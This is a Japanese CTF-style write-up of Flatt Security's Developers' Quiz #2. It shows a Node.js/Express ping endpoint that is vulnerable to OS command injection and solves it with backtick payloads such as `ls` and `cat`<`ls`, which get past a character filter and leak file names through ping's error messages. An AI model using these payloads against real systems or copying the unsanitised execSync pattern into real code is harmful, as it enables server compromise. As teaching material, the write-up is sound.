# Flatt  Security Developers' Quiz #2

## 設問
https://twitter.com/flatt_security/status/1549710781918617600

脆弱性のある環境が与えられ、`ls`コマンド実行時に判明するファイル名の提出が求められている。

```JavaScript
const express = require("express");
const { execSync } = require("child_process");
const app = express();

/*
    local ping check
*/
app.get("/", function(req, res) {
    const ip_address = req.query.ip;

    if(!ip_address){
        res.send("?ip=[your_ip]");
        return;
    }

    if(ip_address.length > 16){
        res.send("Error! IP is too long.");
        return;
    }

    if(/[!@#$%\^&*()\-_+=\[\] {}'";:,:?~\\]/.exec(ip_address)){
        res.send("Error! Your request is filtered!");
        return;
    }

    const cmd = "sh -c 'ping -c 1 " + ip_address + "' 2>&1 >/dev/null; true";
    const stderr = execSync(cmd, {"timeout": 1000});
    if(stderr != ""){
        res.send("Error! " + stderr);
        return;
    }

    res.send("Your IP is in a good state!");
});

app.listen(1337);
```

## 実行時の挙動
```
https://example.com/?ip=hogehoge
```
このような形式で受け取った値`hogehoge`に対してpingが実行される。


```
https://example.com/?ip=127.0.0.1
```

NG要素がないため、「Your IP is in a good state!」と結果出力される。
pingの実行結果、標準出力は画面には返ってこない。

```
https://example.com/?ip=---
```

NGな文字が含まれるので「Error! Your request is filtered!」と結果表示される

```
https://example.com/?ip=xxx
```

pingが実行されるがエラーとなる場合は標準エラー出力「Error! ping: xxx: Temporary failure in name resolution 」が画面に現れる。

このとき、入力値`xxx`がそのまま画面に現れることがポイントだと思われる。


## 入力条件

- 16文字以下であること
- 入力可能な記号が制限されているが、以下は使用できる
  - &
  - |
  - `
  - <
  - \>

### アプローチ
- 複数のコマンドを連結する場合に`&`や`|`、もしくはそれらを2個つなげた記法が使えないか
- `>`が使用できるので、`1>&2`などを付けたし、標準出力も標準エラーに加えられないか
- Bashで使用できる`<<<`でコマンド結果をpingに引き渡せないか

ここまで考えたところで、入力値`xxx`がそのまま画面に表示されたことを思い出す。

`ls`の実行結果をpingのリクエスト先に指定できればよいだけだ。

```
http://example.com/?ip=`ls`
```

このリクエストにより内部的には以下のコマンドが実行される。
```sh
sh -c 'ping -c 1 `ls`' 2>&1 >/dev/null;true
```
`ls`で取得できたファイル名をホスト名に見立ててpingコマンドが実行されるため、当然エラーとなる。
```
Error! ping: wow_congrats_you_executed_a_system_command.txt: Name or service not known
```
期待通り、ファイル名取得することができた。

### その他
前述の通り、他にも使用可能な記号がある。

`ls`では１つのファイル名しか表示されなかったが、`<`を使いほかのコマンドを組み合わせてみる。
```
http://example.com/?ip=`cat`<`ls`
```
これで同じディレクトリの他のファイル名も取得できる。

スペースが不可のためオプションは付けられないが、文字数の許す限りでほかのコマンド結果もレスポンスに返すことができる。
```
http://example.com/?ip=`echo`<`df`
```

